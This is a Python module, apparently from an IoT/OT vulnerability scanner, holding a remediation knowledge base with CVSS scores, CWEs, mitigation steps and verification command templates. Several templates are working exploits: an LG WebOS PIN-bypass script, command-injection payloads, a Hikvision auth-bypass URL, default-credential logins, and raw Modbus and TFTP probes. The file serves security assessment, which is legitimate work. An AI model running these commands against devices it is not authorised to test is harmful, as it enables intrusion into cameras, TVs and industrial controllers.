"""
Knowledge base de recomendaciones de remediación por finding ID.

Cada entrada documenta:
  - title: nombre legible para el reporte
  - severity_default: severidad recomendada cuando el finding se confirma
  - remediation: pasos concretos accionables (no genéricos)
  - references: URLs a disclosures/CVEs/docs vendor
  - cwe: Common Weakness Enumeration ID si aplica
  - cvss_v3: vector y score si está catalogado

El reporter consulta esta KB para enriquecer cada finding con remediación
y referencias auditable. Si un ID no está en la KB, se renderiza solo
descripción + evidencia sin remediación específica.
"""
from __future__ import annotations

from typing import Any, Dict, Optional


# =============================================================================
# Catálogo
# =============================================================================
REMEDIATION_KB: Dict[str, Dict[str, Any]] = {
    # ─────────────────────────────────────────────────────────────────────────
    # CVEs LG WebOS — disclosure Bitdefender 2024-04
    # ─────────────────────────────────────────────────────────────────────────
    "CVE-2023-6317": {
        "title": "LG WebOS — PIN Bypass en secondscreen.gateway",
        "cvss_v3": {
            "score": 7.2,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "severity": "HIGH",
        },
        "cwe": "CWE-287",  # Improper Authentication
        "verification_cmds": [
            "# Bitdefender PoC — script Python independiente, copiar a poc.py:",
            "cat > poc.py << 'EOF'",
            "import asyncio, websockets, ssl, json",
            "ctx = ssl.create_default_context()",
            "ctx.check_hostname = False",
            "ctx.verify_mode = ssl.CERT_NONE",
            "PAYLOAD = {",
            "  'type': 'register',",
            "  'payload': {",
            "    'pairingType': 'PIN',",
            "    'client-key': '',",
            "    'manifest': {",
            "      'manifestVersion': 1,",
            "      'permissions': ['TEST_SECURE', 'CONTROL_INPUT_TEXT',",
            "                      'CONTROL_MOUSE_AND_KEYBOARD', 'WRITE_SETTINGS',",
            "                      'CONTROL_POWER', 'READ_INSTALLED_APPS']",
            "    }",
            "  }",
            "}",
            "async def main():",
            "    async with websockets.connect('wss://{ip}:3001/', ssl=ctx) as ws:",
            "        await ws.send(json.dumps(PAYLOAD))",
            "        for _ in range(2):",
            "            print(await ws.recv())",
            "asyncio.run(main())",
            "EOF",
            "pip install websockets && python3 poc.py",
            "# Si imprime type:registered + client-key NO vacío → VULNERABLE",
            "# Si imprime pairingType:PROMPT → patcheado",
        ],
        "remediation": [
            "Actualizar firmware WebOS a la última versión publicada por LG (post-2024-Q2).",
            "Verificar que el dispositivo NO esté expuesto fuera de la LAN doméstica.",
            "Segmentar el TV en una VLAN aislada del resto de dispositivos críticos.",
            "Revisar logs de pairing por intentos no autorizados.",
        ],
        "references": [
            "https://www.bitdefender.com/blog/labs/lg-webos-tv-vulnerabilities-bitdefender-disclosure/",
            "https://nvd.nist.gov/vuln/detail/CVE-2023-6317",
        ],
    },
    "CVE-2023-6318": {
        "title": "LG WebOS — Command injection en processLGTVMsg",
        "cvss_v3": {"score": 9.1, "vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H", "severity": "HIGH"},
        "cwe": "CWE-78",  # OS Command Injection
        "verification_cmds": [
            "# Requiere client-key obtenido vía CVE-2023-6317",
            "# Plantilla del request inyectado:",
            "# {{\"type\":\"request\",\"uri\":\"ssap://com.webos.service.eim/processLGTVMsg\",\"payload\":{{\"msg\":\"id; uname -a\"}}}}",
            "# Enviar por wss://{ip}:3001/ con client-key en headers de protocolo",
        ],
        "remediation": [
            "Actualizar firmware WebOS (parche post-2024-Q2 corrige la cadena completa).",
            "Bloquear acceso WAN al puerto 3001/TCP.",
            "Cuando se detecte un client-key sospechoso en el pairing log, revocarlo manualmente.",
        ],
        "references": [
            "https://www.bitdefender.com/blog/labs/lg-webos-tv-vulnerabilities-bitdefender-disclosure/",
            "https://nvd.nist.gov/vuln/detail/CVE-2023-6318",
        ],
        "depends_on": "CVE-2023-6317",
    },
    "CVE-2023-6319": {
        "title": "LG WebOS — OS command injection vía luna-service2",
        "cvss_v3": {"score": 9.1, "vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H", "severity": "HIGH"},
        "cwe": "CWE-78",
        "verification_cmds": [
            "# Requiere client-key vía CVE-2023-6317",
            "# Inyección: appId='$(id)' en luna-service2 com.webos.service.appstatus",
        ],
        "remediation": [
            "Actualizar firmware WebOS al parche oficial.",
            "Si no es posible actualizar, monitorear tráfico al puerto 3001/TCP "
            "buscando llamadas a com.webos.service.appstatus con appId malformado.",
        ],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2023-6319",
        ],
        "depends_on": "CVE-2023-6317",
    },
    "CVE-2023-6320": {
        "title": "LG WebOS — Command injection en setVlanStaticAddress",
        "cvss_v3": {"score": 9.1, "vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H", "severity": "HIGH"},
        "cwe": "CWE-78",
        "verification_cmds": [
            "# Requiere client-key vía CVE-2023-6317",
            "# Inyección en vlanId: '100; id #' vía setVlanStaticAddress",
        ],
        "remediation": [
            "Actualizar firmware WebOS al parche oficial.",
            "Aislar TV en VLAN dedicada para evitar laterales si se logra inyección.",
        ],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2023-6320",
        ],
        "depends_on": "CVE-2023-6317",
    },
    # ─────────────────────────────────────────────────────────────────────────
    # CVEs IoT clásicos
    # ─────────────────────────────────────────────────────────────────────────
    "CVE-2017-7921": {
        "title": "Hikvision IP Camera — Auth bypass via magic-cookie",
        "cvss_v3": {"score": 9.8, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "severity": "CRITICAL"},
        "cwe": "CWE-287",
        "verification_cmds": [
            "# Magic cookie bypass — dump user list sin auth:",
            "curl -s 'http://{ip}/Security/users?auth=YWRtaW46MTEK'",
            "# Si devuelve XML con <userList><user><userName>admin</userName>... → vulnerable",
        ],
        "remediation": [
            "Actualizar firmware Hikvision a versión ≥ 5.4.5.",
            "Reemplazar contraseña del admin por una fuerte tras el parche.",
            "Bloquear puerto 80/TCP si no es necesario para gestión legítima.",
            "Auditar logs de cámaras por requests con `auth=YWRtaW46MTEK`.",
        ],
        "references": [
            "https://www.cisa.gov/news-events/ics-advisories/icsa-17-124-01",
            "https://nvd.nist.gov/vuln/detail/CVE-2017-7921",
        ],
    },
    "CVE-2014-9222": {
        "title": "Allegro RomPager <4.34 — Misfortune Cookie",
        "cvss_v3": {"score": 9.8, "vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "severity": "CRITICAL"},
        "cwe": "CWE-94",  # Code Injection
        "remediation": [
            "Reemplazar el dispositivo o instalar firmware de terceros (OpenWrt) si es viable.",
            "El parche oficial casi nunca llega — la mayoría de dispositivos afectados son legacy.",
            "Mientras: bloquear acceso WAN al puerto del management (típicamente 7547).",
        ],
        "references": [
            "https://blog.checkpoint.com/security/misfortune-cookie/",
            "https://nvd.nist.gov/vuln/detail/CVE-2014-9222",
        ],
    },
    "CVE-2017-17215": {
        "title": "Huawei HG532 — SOAP injection (Mirai vector)",
        "cvss_v3": {"score": 9.8, "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "severity": "CRITICAL"},
        "cwe": "CWE-78",
        "remediation": [
            "Actualizar firmware Huawei. Si no hay parche disponible, reemplazar el router.",
            "Bloquear puerto 37215/TCP en el ISP gateway.",
            "Verificar que CPE Management Protocol (TR-069) no esté expuesto a Internet.",
        ],
        "references": [
            "https://www.zerodayinitiative.com/advisories/ZDI-17-1011/",
            "https://nvd.nist.gov/vuln/detail/CVE-2017-17215",
        ],
    },
    # ─────────────────────────────────────────────────────────────────────────
    # IDs internos del agente (no son CVEs oficiales pero documentan posturas)
    # ─────────────────────────────────────────────────────────────────────────
    "DIAL-EXPOSED": {
        "title": "DIAL Service expuesto sin autenticación",
        "cvss_v3": {"score": 5.5, "severity": "MEDIUM"},
        "cwe": "CWE-306",  # Missing Authentication for Critical Function
        "verification_cmds": [
            "# 1. Device descriptor:",
            "curl -s http://{ip}:{port}/dd.xml | head -40",
            "# 2. Application-URL header (endpoint dinámico real):",
            "curl -sI http://{ip}:{port}/dd.xml | grep -i Application-URL",
            "# 3. Enumerar apps disponibles (substituir <app_url>):",
            "curl -s <app_url>/YouTube",
            "# 4. Lanzar app remotamente (PoC explotación):",
            "curl -X POST <app_url>/YouTube",
        ],
        "remediation": [
            "Deshabilitar DIAL en la configuración del TV/dispositivo si no se usa Cast.",
            "Si DIAL es necesario: restringir puerto 1664/TCP a la subnet de cast clients.",
            "Considerar bloquear `POST /apps/<app_name>` en firewall LAN para prevenir "
            "lanzamiento remoto no autorizado de aplicaciones.",
        ],
        "references": [
            "http://www.dial-multiscreen.org/dial-protocol-specification",
        ],
    },
    "LG-WEBOS-EXPOSED": {
        "title": "LG WebOS pairing endpoint detectado",
        "cvss_v3": {"score": 1.0, "severity": "INFO"},
        "cwe": None,
        "remediation": [
            "INFO: la mera presencia de WebOS no es vulnerabilidad. Verificar que el "
            "firmware esté actualizado para mitigar CVE-2023-6317-6320.",
        ],
        "references": [],
    },
    "LG-WEBOS-CVE-2023-6317": {
        "title": "LG WebOS CVE-2023-6317 confirmado vía bypass real",
        "cvss_v3": {"score": 9.1, "severity": "CRITICAL"},
        "cwe": "CWE-287",
        "remediation": [
            "ACCIÓN INMEDIATA: actualizar firmware WebOS al último parche.",
            "Si la TV está en producción/uso, AISLAR de la red mientras se aplica patch.",
            "Revocar el client-key obtenido por el agente (en este reporte) "
            "directamente desde la TV (Settings > Mobile App).",
            "Auditar otros dispositivos LG WebOS de la misma red.",
        ],
        "references": [
            "https://www.bitdefender.com/blog/labs/lg-webos-tv-vulnerabilities-bitdefender-disclosure/",
        ],
    },
    "MQTT-ANON-ACCESS": {
        "title": "MQTT Broker — Conexión anónima permitida",
        "cvss_v3": {"score": 8.5, "severity": "HIGH"},
        "cwe": "CWE-306",
        "verification_cmds": [
            "# Conectar y suscribir a TODO sin auth:",
            "mosquitto_sub -h {ip} -p 1883 -t '#' -v -C 10",
            "# Publicar mensaje arbitrario:",
            "mosquitto_pub -h {ip} -p 1883 -t 'test/probe' -m 'hello'",
        ],
        "remediation": [
            "Configurar `allow_anonymous false` en mosquitto.conf.",
            "Establecer ACLs por client-id + topic para limitar lo que puede leer/escribir cada cliente.",
            "Activar TLS (puerto 8883) y deshabilitar 1883/cleartext.",
            "Auditar logs del broker buscando connect events con client-id sospechoso.",
        ],
        "references": [
            "https://mosquitto.org/documentation/authentication-methods/",
        ],
    },
    "MQTT-WILDCARD-SUB": {
        "title": "MQTT — Subscribe wildcard `#` permitido",
        "cvss_v3": {"score": 9.5, "severity": "CRITICAL"},
        "cwe": "CWE-285",  # Improper Authorization
        "remediation": [
            "Implementar ACLs en mosquitto que rechazen patrones `#` y `+/+/+`.",
            "Auditar topics existentes y mover datos sensibles a topics restringidos.",
            "Considerar broker autenticado (Auth plugin) en lugar de anonymous.",
        ],
        "references": [
            "https://mosquitto.org/documentation/dynamic-security/",
        ],
    },
    "MODBUS-NO-AUTH-FC17": {
        "title": "Modbus TCP — FC17 (Report Slave ID) sin autenticación",
        "cvss_v3": {"score": 7.5, "severity": "HIGH"},
        "cwe": "CWE-306",
        "verification_cmds": [
            "# Modbus TCP FC17 (Report Slave ID) — frame raw via nc:",
            "echo -ne '\\x00\\x01\\x00\\x00\\x00\\x02\\x01\\x11' | nc -w2 {ip} 502 | xxd",
            "# Alternativa con pymodbus:",
            "# pip install pymodbus",
            "python3 -c \"from pymodbus.client import ModbusTcpClient; "
            "c=ModbusTcpClient('{ip}',port=502); print(c.read_coils(0,8))\"",
        ],
        "remediation": [
            "Modbus TCP NO tiene autenticación nativa. Único mitigación real: aislar "
            "la red OT de la corporativa (Purdue Model L2/L3).",
            "Implementar firewall industrial (Tofino, Bayshore) entre IT y OT.",
            "Considerar reemplazar a Modbus over TLS o protocolo moderno (OPC UA).",
        ],
        "references": [
            "https://www.modbus.org/docs/Modbus_Application_Protocol_V1_1b3.pdf",
        ],
    },
    "MODBUS-NO-AUTH-READCOILS": {
        "title": "Modbus TCP — FC1 (Read Coils) sin auth",
        "cvss_v3": {"score": 9.0, "severity": "CRITICAL"},
        "cwe": "CWE-306",
        "remediation": [
            "Aislar PLC/RTU en red dedicada OT (no enrutable desde IT).",
            "Si requiere acceso desde IT: usar gateway con whitelisting por IP origen.",
            "Auditar lecturas frecuentes de coils sensibles.",
        ],
        "references": [],
    },
    "RTSP-NO-AUTH": {
        "title": "RTSP — Stream sin autenticación",
        "cvss_v3": {"score": 7.5, "severity": "HIGH"},
        "cwe": "CWE-306",
        "verification_cmds": [
            "# OPTIONS (descubre métodos disponibles):",
            "ffprobe -v debug rtsp://{ip}:{port}/",
            "# DESCRIBE (intenta obtener SDP del stream):",
            "ffprobe rtsp://{ip}:{port}/live",
            "# Capturar 5s de stream sin auth:",
            "ffmpeg -i rtsp://{ip}:{port}/live -t 5 capture.mp4",
        ],
        "remediation": [
            "Configurar autenticación Basic/Digest en la cámara IP.",
            "Cambiar credenciales por defecto si la cámara las pide tras activar auth.",
            "Restringir acceso al puerto 554/TCP a IPs autorizadas (NVR).",
        ],
        "references": [],
    },
    "RTSP-DEFAULT-CRED": {
        "title": "RTSP — Credenciales por defecto aceptadas",
        "cvss_v3": {"score": 9.0, "severity": "CRITICAL"},
        "cwe": "CWE-521",  # Weak Password Requirements
        "verification_cmds": [
            "# Acceso al stream con creds default (substituir user/pass):",
            "ffprobe rtsp://admin:admin@{ip}:{port}/live",
            "ffmpeg -i rtsp://admin:admin@{ip}:{port}/live -t 5 capture.mp4",
        ],
        "remediation": [
            "ACCIÓN INMEDIATA: cambiar password admin a una fuerte (16+ chars, mixto).",
            "Verificar otros vectores: web admin, ONVIF, SDK proprietario.",
            "Habilitar 2FA si la cámara lo soporta.",
            "Revisar histórico de conexiones por accesos no autorizados.",
        ],
        "references": [],
    },
    "TELNET-EXPOSED": {
        "title": "Telnet expuesto",
        "cvss_v3": {"score": 5.5, "severity": "MEDIUM"},
        "cwe": "CWE-319",  # Cleartext Transmission
        "verification_cmds": [
            "# Banner grab:",
            "echo | nc -w2 {ip} 23",
            "# Conexión interactiva:",
            "telnet {ip} 23",
        ],
        "remediation": [
            "Deshabilitar Telnet (puerto 23/TCP).",
            "Usar SSH (puerto 22/TCP) con auth por clave para gestión remota.",
            "Si Telnet es crítico para legacy, restringir a IP management interna + VPN.",
        ],
        "references": [],
    },
    "TELNET-DEFAULT-CRED": {
        "title": "Telnet acepta credenciales por defecto",
        "cvss_v3": {"score": 9.5, "severity": "CRITICAL"},
        "cwe": "CWE-521",
        "remediation": [
            "ACCIÓN INMEDIATA: cambiar password root y bloquear cuentas default (admin, ubnt, etc.).",
            "Migrar a SSH con auth por clave.",
            "Verificar que el dispositivo no esté en una botnet (Mirai-like).",
        ],
        "references": [
            "https://krebsonsecurity.com/2016/10/who-makes-the-iot-things-under-attack/",
        ],
    },
    "TELNET-MIRAI-BUSYBOX": {
        "title": "Telnet con banner BusyBox (vector Mirai)",
        "cvss_v3": {"score": 7.0, "severity": "HIGH"},
        "cwe": "CWE-319",
        "remediation": [
            "Deshabilitar Telnet inmediatamente.",
            "Si el dispositivo es de los modelos afectados por Mirai (DVR, IP cam, "
            "router): considerar reemplazo si no hay update firmware disponible.",
        ],
        "references": [],
    },
    "FTP-ANON-LOGIN": {
        "title": "FTP — Login anónimo permitido",
        "cvss_v3": {"score": 7.5, "severity": "HIGH"},
        "cwe": "CWE-287",
        "verification_cmds": [
            "# Anonymous login + listar:",
            "ftp -n {ip} 21 <<EOF",
            "user anonymous test@test.com",
            "ls",
            "quit",
            "EOF",
        ],
        "remediation": [
            "Deshabilitar login anónimo en el FTP server (configuración del daemon).",
            "Si requiere acceso público: limitar a directorio chrooteado sin lectura "
            "de paths sensibles (no /etc, no /var/log).",
            "Considerar migrar a SFTP (sobre SSH) o WebDAV con TLS.",
        ],
        "references": [],
    },
    "SMB-V1-EXPOSED": {
        "title": "SMBv1 expuesto (vector EternalBlue)",
        "cvss_v3": {"score": 8.5, "severity": "HIGH"},
        "cwe": "CWE-94",
        "remediation": [
            "Deshabilitar SMBv1 inmediatamente.",
            "Usar solo SMBv2/v3 con sign+seal habilitados.",
            "Aplicar parche MS17-010 si aplica al SO subyacente.",
            "Auditar tráfico al puerto 445/TCP por conexiones desde fuera del dominio.",
        ],
        "references": [
            "https://docs.microsoft.com/en-us/windows-server/storage/file-server/troubleshoot/detect-enable-and-disable-smbv1-v2-v3",
        ],
    },
    "TFTP-ANON-DOWNLOAD": {
        "title": "TFTP — Descarga anónima de archivos sensibles",
        "cvss_v3": {"score": 8.5, "severity": "CRITICAL"},
        "cwe": "CWE-306",
        "verification_cmds": [
            "# Descargar firmware sin auth:",
            "tftp {ip} -c get firmware.bin",
            "tftp {ip} -c get config.bin",
            "tftp {ip} -c get running-config",
        ],
        "remediation": [
            "Deshabilitar TFTP server si no es estrictamente necesario.",
            "Si requerido (ej: PXE boot): restringir IP origen + chroot.",
            "Migrar a SFTP/HTTPS para distribución de firmware.",
        ],
        "references": [],
    },
    "CWMP-ROMPAGER-CVE-2014-9222": {
        "title": "CWMP — Banner RomPager (Misfortune Cookie)",
        "cvss_v3": {"score": 9.8, "severity": "CRITICAL"},
        "cwe": "CWE-94",
        "remediation": [
            "Reemplazar dispositivo o flashear con OpenWrt si HW lo permite.",
            "Bloquear acceso WAN al puerto 7547/TCP.",
        ],
        "references": [
            "https://blog.checkpoint.com/security/misfortune-cookie/",
        ],
    },
    "CWMP-MIRAI-CVE-2017-17215": {
        "title": "CWMP — Banner Huawei HG532 (vector Mirai)",
        "cvss_v3": {"score": 9.8, "severity": "CRITICAL"},
        "cwe": "CWE-78",
        "remediation": [
            "Reemplazar el router. Hardware EOL sin soporte.",
            "Si no es viable: bloquear puerto 37215/TCP + 7547/TCP en upstream.",
        ],
        "references": [],
    },
    "MDNS-EXPOSED": {
        "title": "mDNS — Información del dispositivo expuesta",
        "cvss_v3": {"score": 1.0, "severity": "INFO"},
        "cwe": "CWE-200",  # Information Exposure
        "verification_cmds": [
            "# Listar todos los servicios mDNS publicados:",
            "avahi-browse -art",
            "# O con dns-sd (macOS) / nmap (multiplataforma):",
            "nmap --script=dns-service-discovery -sU -p 5353 {ip}",
        ],
        "remediation": [
            "INFO: la propaganda mDNS es funcional (cast, AirPlay, HomeKit). "
            "Reduce solo si no usas estas funciones.",
            "Aislar dispositivos IoT en VLAN dedicada para que su mDNS no "
            "alcance la red corporativa.",
            "Verificar que las propiedades publicadas (serial, MAC, modelo) "
            "no incluyan info sensible.",
        ],
        "references": [
            "https://datatracker.ietf.org/doc/html/rfc6762",
        ],
    },
    "BACNET-NO-AUTH-WHOIS": {
        "title": "BACnet/IP — Who-Is responde sin auth",
        "cvss_v3": {"score": 5.5, "severity": "MEDIUM"},
        "cwe": "CWE-306",
        "remediation": [
            "BACnet no tiene auth nativa en versiones < 2010. Aislar red de building automation.",
            "Implementar BACnet/SC (Secure Connect) en versiones recientes (2020+).",
            "Whitelisting de fuente IP autorizada en switches gestionados.",
        ],
        "references": [
            "https://bacnet.org/",
        ],
    },
    "CHROMECAST-INFO-DISCLOSURE": {
        "title": "Chromecast — Eureka API expone información sensible",
        "cvss_v3": {"score": 5.0, "severity": "MEDIUM"},
        "cwe": "CWE-200",  # Information Exposure
        "remediation": [
            "Aislar Chromecast en VLAN guest sin acceso a recursos críticos.",
            "Hardware reciente (Chromecast 4+) con Google TV reduce esta exposición.",
        ],
        "references": [],
    },
    "UPNP-IGD-EXPOSED": {
        "title": "UPnP IGD — AddPortMapping sin autenticación",
        "cvss_v3": {"score": 7.5, "severity": "HIGH"},
        "cwe": "CWE-306",
        "remediation": [
            "Deshabilitar UPnP en el router si no se usa.",
            "Verificar regularmente la tabla de port mappings activos.",
            "Considerar bloquear puerto 1900/UDP en interfaces WAN.",
        ],
        "references": [
            "https://kb.cert.org/vuls/id/357851",  # UPnP discovery
        ],
    },
    "OPCUA-EXPOSED": {
        "title": "OPC-UA — Servicio industrial expuesto",
        "cvss_v3": {"score": 5.5, "severity": "MEDIUM"},
        "cwe": "CWE-306",
        "remediation": [
            "Configurar SecurityPolicy != 'None' en el server.",
            "Deshabilitar UserTokenPolicy 'Anonymous'. Usar X.509 o user/pass robusto.",
            "Aislar red OPC-UA en VLAN OT sin enrutamiento a IT.",
        ],
        "references": [
            "https://opcfoundation.org/security/",
        ],
    },
    "WEAK-CREDENTIALS": {
        "title": "Credenciales por defecto — Acceso admin sin restricción",
        "cvss_v3": {"score": 9.8, "severity": "CRITICAL",
                    "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"},
        "cwe": "CWE-1392",
        "remediation": [
            "Cambiar contraseña del administrador inmediatamente por una robusta (≥16 chars, alfanumérica + símbolos).",
            "Deshabilitar cuentas de servicio con credenciales fijas si las hay.",
            "Implementar limitación de intentos (lockout) tras 5 fallos consecutivos.",
            "Habilitar autenticación multifactor si el firmware lo soporta.",
            "Auditar otras cuentas del sistema con contraseñas vacías o triviales.",
        ],
        "verification_cmds": [
            "# Verificar acceso con credenciales por defecto:",
            "curl -sk 'http://{ip}:{port}/login.php?username=admin&password=password' | head -c 200",
            "# Si devuelve 'loginok' → credenciales por defecto activas",
        ],
        "references": [
            "https://cwe.mitre.org/data/definitions/1392.html",
            "https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication",
        ],
    },
    "SSH-DROPBEAR-OLD": {
        "title": "SSH Dropbear — Versión obsoleta con CVEs históricos",
        "cvss_v3": {"score": 7.0, "severity": "HIGH"},
        "cwe": "CWE-119",
        "remediation": [
            "Actualizar Dropbear a la última versión estable (≥2022.83).",
            "Deshabilitar autenticación por contraseña: usar solo clave pública (AuthorizedKeysFile).",
            "Restringir acceso SSH por IP origen con iptables/nftables.",
            "Si SSH no se usa para gestión, deshabilitar el servicio.",
        ],
        "verification_cmds": [
            "ssh -o StrictHostKeyChecking=no {ip} -p {port} 2>&1 | head -5",
            "nmap -sV -p {port} --script=ssh2-enum-algos {ip}",
        ],
        "references": [
            "https://matt.ucc.asn.au/dropbear/CHANGES",
        ],
    },
}


def get_remediation(finding_id: str) -> Optional[Dict[str, Any]]:
    """Devuelve entrada del KB para un finding ID, o None si no está catalogado."""
    if not finding_id:
        return None
    return REMEDIATION_KB.get(finding_id)



def render_verification_cmds(finding_id: str, ip: str,
                             port: Optional[int] = None) -> list:
    """Resuelve placeholders {ip} y {port} en las plantillas de verification_cmds.

    Devuelve lista de líneas listas para pegar en un script reproducible.
    Lista vacía si el ID no tiene plantillas o no está en KB.
    """
    kb = get_remediation(finding_id)
    if not kb:
        return []
    templates = kb.get("verification_cmds", []) or []
    if not templates:
        return []
    rendered: list = []
    port_str = str(port) if port else "<port>"
    for line in templates:
        if not isinstance(line, str):
            continue
        # Substitución de placeholders. Usamos replace en lugar de format
        # para ser tolerantes a otras llaves literales del comando.
        out = line.replace("{ip}", ip).replace("{port}", port_str)
        rendered.append(out)
    return rendered
